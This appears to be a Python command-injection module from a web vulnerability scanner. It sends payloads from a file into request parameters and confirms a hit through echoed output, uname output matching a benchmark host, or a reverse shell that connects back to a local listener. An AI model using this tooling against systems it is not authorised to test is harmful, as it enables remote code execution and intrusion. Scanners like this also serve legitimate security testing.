import socket, threading, time

from library import make_request, make_results_obj 

sock = socket.socket()
sock.settimeout(1)
sock.bind(("localhost", 5555))

reverse_shell_res = [False] # For threading uses

def receive_reverse_shell():
	reverse_shell_res[0] = False	
	try:
		sock.listen(1)
		conn, addr = sock.accept()
		x = conn.recv(256)
		reverse_shell_res[0] = ("/bin/sh" in x or "/bin/bash" in x)
	except:
		pass

def inject_payload(injection_obj, payload):
	method, link, params, cookie = injection_obj
	result = False
	if "/bin/sh" in payload or "bash" in payload:
		thread = threading.Thread(target=receive_reverse_shell)
		thread.start()
		make_request(injection_obj, payload)
		thread.join()
		result = reverse_shell_res[0]

	elif "echo" in payload or "uname" in payload:
		response = make_request(injection_obj, payload).text
	
		if "echo" in payload:
			argument_index = payload.index("echo ") + 5
			if payload[argument_index:] in response:
				result = True

		elif "uname" in payload:
			correct_output = "Linux benchmark 4.13.0-38-generic #43~16.04.1-Ubuntu SMP"
			correct_output_2 = "x86_64 x86_64 x86_64 GNU/Linux"
			if correct_output in response and correct_output_2 in response:
				result = True

	else:
		print("Unrecognized Payload")

	if result: return make_results_obj(injection_obj, payload)


def iterate_payloads(injection_obj_lst):
  results = []
  for injection_obj in injection_obj_lst:
    method, link, params, cookie = injection_obj
    for param in params:
      payloads = open('payloads/command_injection.txt').readlines()
      for payload in payloads:
        result = inject_payload(injection_obj, payload)
        if result: results.append(result)
  return results

def run(injection_obj_lst):
  print("[*] Testing for Command Injection")
  results = iterate_payloads(injection_obj_lst)
  sock.close()
  return results

# TODO for testing, remove when done
if __name__ == '__main__':
  injection_obj = ['POST','http://127.0.0.1/commandinjection/commandinjection.php', ['host'], '']
  print(run([injection_obj]))